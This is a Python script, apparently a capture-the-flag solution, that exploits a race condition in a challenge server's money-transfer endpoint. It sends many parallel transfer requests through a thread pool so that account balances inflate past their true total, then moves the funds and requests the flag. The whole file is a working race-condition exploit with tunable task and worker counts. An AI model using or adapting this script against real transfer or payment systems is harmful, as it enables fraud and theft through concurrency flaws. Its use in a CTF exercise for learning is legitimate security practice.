"""Script to perform parallel transactions to exploit the lock issue in
the server. It is observed that tasks and workers both kept at 50 gives the
flag the quickest, but you may need to re-run it. To reset the account values
use the --reset flag.

Run as follows:

    poetry run main.py <url> --tasks 50 --workers 50
"""

import argparse

import requests

from concurrent.futures import ThreadPoolExecutor, as_completed


def parser() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Script to exploit ACID vulnerability and get flag",
    )
    parser.add_argument("url", metavar="url", help="challenge url")
    parser.add_argument(
        "--reset", help="reset accounts", action="store_true", default=False
    )
    parser.add_argument(
        "--tasks",
        metavar="[int]",
        type=int,
        help="number of transfer tasks (default: %(default)s)",
        default=30,
    )
    parser.add_argument(
        "--workers",
        metavar="[int]",
        type=int,
        help="number of parallel workers (default: %(default)s)",
        default=10,
    )

    args = parser.parse_args()
    return args


def query(url: str, params: dict) -> requests.models.Response:
    response = requests.get(url, params=params)
    response.raise_for_status()
    return response


def transfer(url: str, from_: str = "1", to_: str = "2", amount: str = "1") -> str:
    response = query(url, {"from": from_, "to": to_, "amount": amount})
    return response.text


def dump(url: str) -> str:
    response = query(url, {"dump": 1})
    return response.text


def reset(url: str) -> str:
    response = query(url, {"reset": 1})
    return response.text


def get_flag(url: str, from_: str) -> str:
    response = query(url, {"flag": 1, "from": from_})
    return response.text


def parse_dump(dump_str):
    lines = dump_str.strip().split("\n")[1:-1]

    result_dict = {}

    for line in lines:
        key, value = line.split()
        result_dict[int(key)] = int(value)

    return result_dict


def main(url: str, tasks: int, workers: int) -> None:
    print("Running tasks...")

    with ThreadPoolExecutor(max_workers=workers) as executor:
        task_list = {executor.submit(transfer, url): i for i in range(tasks)}
        for task in as_completed(task_list):
            try:
                task.result()
            except Exception:
                # print(f"encountered exception: {exc}")
                continue

    values = parse_dump(dump(url))

    if sum(values.values()) <= 247:
        print(
            f"flag not found\n{values=} sum={(sum(values.values()))}, try increasing tasks and workers"
        )
        return

    transfer(url, from_="1", to_="2", amount=values[1])
    print("flag:", get_flag(url, from_="2"))


if __name__ == "__main__":
    args = parser()
    print(reset(args.url)) if args.reset else main(args.url, args.tasks, args.workers)
